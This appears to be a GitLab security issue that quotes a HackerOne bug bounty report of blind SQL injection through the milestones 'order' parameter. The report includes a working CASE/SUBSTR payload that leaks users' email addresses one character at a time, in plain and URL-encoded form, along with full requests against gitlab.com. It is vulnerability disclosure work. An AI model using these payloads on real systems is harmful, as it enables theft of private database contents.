https://hackerone.com/reports/298176

Via our HackerOne paid bug bounty program A SQL Injection in MilestoneFinder order method was reported by Jobert. Can we validate the finding and determine the following:

1. Is this a known security issue, currently?

1. If this is a known issue, are there mitigations/patches in place to address this?

1. If the above is 'yes', where are those mitigations?

Here are the details for the finding Jobert provided:

The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the `Groups::MilestonesController`. When the **_index_** action is requested, the `milestones` method is called. Here's the first two lines of the method:

**_app/controllers/groups/milestones_controller.rb_**
![image](https://gitlab.com/gitlab-com/security/uploads/9cf95004505d7da604d6d96d1d64f95f/image.png)

This code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the `execute` method. Here's the method:

**_app/finders/milestone_finder.rb_**
![image](https://gitlab.com/gitlab-com/security/uploads/fa769d10bf552f64b3ef31a3f88821cc/image.png)

The `order` call on the last line is implemented as following:

**_app/finders/milestone_finder.rb_**
![image](https://gitlab.com/gitlab-com/security/uploads/4c7322109560581bb5724b0d2adbcd11/image.png)

As can be seen on line 2 of the method, `reorder` is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here's a request example:

**_Request_**
![image](https://gitlab.com/gitlab-com/security/uploads/ac72a52b0807eb78794fd8387fa262cb/image.png)

**_Response_**
![image](https://gitlab.com/gitlab-com/security/uploads/9af84f6b0be3c215a771743f176f04ad/image.png)

Then, consider the following SQL injection payload:

`(CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)`

This payload does three things: it fetches the `email` column from the `users` table where the `username` matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the `email` (the `SUBSTR(<>, 1, 1)` call) and compares that to a `a`. If that's the case, it'll compare the `id` of the current milestone to `429944`. If that is true, it'll sort on column number 2. If that is **_not_** the case, it'll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character `a`.

To prepare the payload, replace `429944` in the payload with a milestone ID of your account and URL encode it:

**_Encoded payload_**

`%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29`

Now submit the first request:

**_Request 1 (`a`)_**

`GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1
Host: gitlab.com
Accept: application/json
...`

**_Response 1_**
![image](https://gitlab.com/gitlab-com/security/uploads/dded18138f9db9c2625827681cc6e7ac/image.png)

In the response above the milestones are sorted **_descending_** based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter `j`, the following behavior is observed:

**_Request 2 (`j`)_**

`GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1
Host: gitlab.com
Accept: application/json
...`

**_Response 2_**
![image](https://gitlab.com/gitlab-com/security/uploads/1d4eaec257ecc67d2a0e92d1534bfc62/image.png)

Because the first character of my email is actually `j`, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the `SUBSTR` function can be changed to guess characters on other positions of the value.

This has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).